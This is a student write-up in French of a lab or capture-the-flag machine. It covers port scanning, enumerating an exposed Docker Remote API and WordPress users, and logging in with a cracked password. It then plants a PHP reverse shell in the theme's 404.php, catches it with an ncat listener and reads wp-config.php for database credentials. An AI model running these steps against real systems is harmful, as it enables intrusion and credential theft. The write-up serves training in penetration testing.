# Writeup: Docker Pivoting and Exploitation

## Informations générales

| **Nom**    | Lambert         |
|------------|-----------------|
| **Prénom** | Lenny           |
| **Groupe** | Y1              |

| **Thème**              | **Difficulté** |
|-------------------------|----------------|
| Port scanning          | Easy 🟢     |
| Webapp attacks         | Hard 🔴     |
| Code injection         |                |
| Pivoting (Docker)      |                |
| Exploitation           |                |
| Password cracking      |                |
| Brute forcing          |                |

---

## Outils utilisés

- [Netdiscover](https://www.kali.org/tools/netdiscover/)
- [Nmap](https://www.kali.org/tools/nmap/)
- [Dirb](https://www.kali.org/tools/dirb/)
- [Ncat (Nmap)](https://www.kali.org/tools/nmap/#ncat)
- [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

---

## Etape 1 : Net Discover

**Objectif :** Récupérer l’adresse IP de la machine cible.

Commande :
```bash
netdiscover
```

**Exemple de résultat :**
![Netdiscover output](https://prod-files-secure.s3.us-west-2.amazonaws.com/27893aab-88a5-49bc-8330-c8ebab37838a/cc68ba38-56b5-4821-8104-5d96395a959d/image.png)

---

## Etape 2 : Scan de port avec Nmap

**Objectif :** Identifier les ports ouverts et les services actifs sur la cible.

Commande :
```bash
sudo nmap -sV -sC -O -T5 -p- -oN discover.txt 192.168.56.104
```

| **Option**  | **Description**                             |
|-------------|---------------------------------------------|
| `-sV`       | Détecte les versions des services          |
| `-sC`       | Utilise les scripts NSE                     |
| `-O`        | Détecte le système d’exploitation           |
| `-p-`       | Scanne tous les ports                       |
| `-oN`       | Sauvegarde les résultats dans un fichier     |

**Exemple de résultat :**

| **Port** | **Service** | **Description**           | **Status** | **Détails**                  |
|----------|-------------|---------------------------|------------|------------------------------|
| 22       | SSH         | OpenSSH                  | Open       |                              |
| 8000     | HTTP        | Apache httpd             | Open       | Service WordPress            |
| 2375     | Docker API  | Docker Remote API        | Open       | API pour gérer Docker à distance |

**Analyse : Port 2375 (Docker Remote API)**

| **Aspect**        | **Détails**                                                                 |
|--------------------|----------------------------------------------------------------------------|
| **Rôle**           | Contrôler le daemon Docker à distance                                    |
| **Protocole**      | TCP                                                                      |
| **Risque**         | Permet à un attaquant d'exécuter des commandes Docker sur l'hôte compromis |

---

## Etape 3 : Docker Recon

### Liste des images Docker disponibles

Commande :
```bash
docker -H tcp://192.168.56.104:2375 image ls
```

| **Repository**                | **Tag**   | **Image ID** | **Commentaires**                                   |
|--------------------------------|-----------|--------------|--------------------------------------------------|
| wordpress                     | latest    | c4260b289fc7 | Héberge un service WordPress                   |
| mysql                         | 5.7       | c73c7527c03a |                                                  |
| jeroenpeeters/docker-ssh      | latest    | 7d3ecb48134e | Serveur SSH pour conteneurs (source DockerHub)  |

### Liste des conteneurs actifs

Commande :
```bash
docker -H tcp://192.168.56.104:2375 ps -a
```

| **Container ID**  | **Image**                | **Ports**               | **Nom**               |
|--------------------|--------------------------|-------------------------|-----------------------|
| 8f4bca8ef241      | wordpress:latest         | 0.0.0.0:8000->80/tcp    | content_wordpress_1   |
| 13f0a3bb2706      | mysql:5.7                | 3306/tcp                | content_db_1          |
| b90babce1037      | jeroenpeeters/docker-ssh | 22/tcp, 8022/tcp        | content_ssh_1         |

### Analyse du réseau Docker

Commande :
```bash
docker -H tcp://192.168.56.104:2375 network inspect content_default
```

| **Nom**           | **Adresse IPv4** |
|--------------------|------------------|
| content_db_1      | 172.18.0.2/16    |
| content_wordpress_1 | 172.18.0.3/16    |
| content_ssh_1     | 172.18.0.4/16    |

---

## Etape 4 : Scan WordPress avec Wpscan

**Objectif :** Identifier les utilisateurs et plugins vulnérables.

Commande :
```bash
wpscan --url http://192.168.56.104:8000 -e u,p
```

| **Utilisateur trouvé** | **Mot de passe** |
|--------------------------|------------------|
| bob                      | Welcom1          |

**Connexion au tableau de bord WordPress :** http://192.168.56.104:8000/wp-admin

Flag : `flag_1{2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998}`

---

## Etape 5 : Injection d'une backdoor dans WordPress

**Objectif :** Obtenir un shell distant sur l'hôte via un fichier PHP malveillant.

### Procédure
1. Modifier le fichier `404.php` via WordPress (Appearance > Editor > 404 Template).
2. Insérer un script de reverse shell PHP.
3. Déployer et accéder à : `http://192.168.56.104:8000/wp-content/themes/twentyseventeen/404.php`

Commande pour écouter le reverse shell :
```bash
ncat -lvnp 4444
```

**Shell obtenu :** Compte `www-data`

---

## Analyse et exploitation Docker

Depuis le shell, accéder à `/var/www/html/wp-config.php` pour récupérer les identifiants MySQL.

---

## Diagramme de fonctionnement

![Docker Workflow](https://prod-files-secure.s3.us-west-2.amazonaws.com/27893aab-88a5-49bc-8330-c8ebab37838a/174c0cac-e9aa-41c5-a6cf-2ddc46451384/image.png)

---
